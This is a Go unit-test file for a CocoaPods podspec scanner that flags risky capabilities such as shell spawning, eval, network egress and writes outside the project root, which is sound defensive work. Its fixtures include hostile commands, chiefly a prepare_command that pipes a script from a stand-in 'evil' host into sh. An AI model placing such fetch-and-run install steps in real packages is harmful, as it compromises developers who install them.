package cocoapods_test

import (
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
	"github.com/qwexvf/aegis-cli/internal/infra/scan/ast"
	"github.com/qwexvf/aegis-cli/internal/infra/scan/ast/cocoapods"
)

func newScanner(t *testing.T) *cocoapods.Scanner {
	t.Helper()
	s, err := cocoapods.New()
	if err != nil {
		t.Fatalf("cocoapods.New: %v", err)
	}
	return s
}

func caps(t *testing.T, src string) map[domain.Capability]struct{} {
	t.Helper()
	s := newScanner(t)
	f := &ast.Findings{Capabilities: map[domain.Capability]struct{}{}}
	s.AnalyzeFile("test.podspec", []byte(src), f)
	return f.Capabilities
}

func hasCap(t *testing.T, src string, want domain.Capability) {
	t.Helper()
	if _, ok := caps(t, src)[want]; !ok {
		t.Errorf("expected %s capability, got none", want)
	}
}

func noCap(t *testing.T, src string, unwanted domain.Capability) {
	t.Helper()
	if _, ok := caps(t, src)[unwanted]; ok {
		t.Errorf("unexpected %s capability", unwanted)
	}
}

func TestNew_NoError(t *testing.T) {
	newScanner(t)
}

func TestPrepareCommand_ShellSpawn(t *testing.T) {
	hasCap(t, `
Pod::Spec.new do |s|
  s.name = "Foo"
  s.prepare_command = "curl https://evil.example.com/x.sh | sh"
end
`, domain.CapShellSpawn)
}

func TestScriptPhase_ShellSpawn(t *testing.T) {
	hasCap(t, `
Pod::Spec.new do |s|
  s.script_phase :name => "Build", :script => "rm -rf /tmp/x"
end
`, domain.CapShellSpawn)
}

func TestSystem_ShellSpawn(t *testing.T) {
	hasCap(t, `
Pod::Spec.new do |s|
  system("rm -rf /tmp/x")
end
`, domain.CapShellSpawn)
}

func TestBacktick_ShellSpawn(t *testing.T) {
	hasCap(t, "result = `ls -la`", domain.CapShellSpawn)
}

func TestEval_DynamicEval(t *testing.T) {
	hasCap(t, `eval("puts 1")`, domain.CapDynamicEval)
}

func TestBase64_Decode(t *testing.T) {
	hasCap(t, `payload = Base64.decode64("Zm9v")`, domain.CapBase64Decode)
}

func TestNetHttp_NetEgress(t *testing.T) {
	hasCap(t, `Net::HTTP.get(URI("http://example.com"))`, domain.CapNetEgress)
}

func TestOpenUri_NetEgress(t *testing.T) {
	hasCap(t, `data = open("https://example.com/a.txt").read`, domain.CapNetEgress)
}

func TestTCPSocket_NetEgress(t *testing.T) {
	hasCap(t, `sock = TCPSocket.new("1.2.3.4", 9000)`, domain.CapNetEgress)
}

func TestEnvRead(t *testing.T) {
	src := `token = ENV["HOME"]`
	s := newScanner(t)
	f := &ast.Findings{
		Capabilities: map[domain.Capability]struct{}{},
		EnvReads:     map[string]struct{}{},
	}
	s.AnalyzeFile("x.podspec", []byte(src), f)
	// env read isn't a capability — confirm scanner doesn't panic; coverage
	// of env names lives in dispatcher integration tests.
	if len(f.Capabilities) != 0 {
		t.Errorf("ENV read alone should not raise a capability, got %v", f.Capabilities)
	}
}

func TestFileWrite_FSWrite(t *testing.T) {
	hasCap(t, `File.write("/tmp/x", "data")`, domain.CapFSWriteOutsideRoot)
}

func TestFileOpenWriteMode_FSWrite(t *testing.T) {
	hasCap(t, `File.open("/tmp/x", "w") { |f| f.puts "x" }`, domain.CapFSWriteOutsideRoot)
}

func TestFileUtils_FSWrite(t *testing.T) {
	hasCap(t, `FileUtils.cp("a", "/tmp/b")`, domain.CapFSWriteOutsideRoot)
}

func TestRawIPLiteral_Match(t *testing.T) {
	hasCap(t, `url = "http://192.168.1.1/beacon"`, domain.CapRawIPLiteral)
}

func TestRawIPLiteral_NoMatch_Domain(t *testing.T) {
	noCap(t, `url = "https://example.com/api"`, domain.CapRawIPLiteral)
}

func TestCleanPodspec_NoCaps(t *testing.T) {
	got := caps(t, `
Pod::Spec.new do |s|
  s.name         = "MyPod"
  s.version      = "1.0.0"
  s.summary      = "Plain"
  s.homepage     = "https://example.com"
  s.license      = "MIT"
  s.authors      = { "Me" => "me@example.com" }
  s.source       = { :git => "https://github.com/me/MyPod.git", :tag => s.version.to_s }
  s.source_files = "Sources/**/*.swift"
end
`)
	if len(got) != 0 {
		t.Errorf("expected no capabilities for clean podspec, got %v", got)
	}
}
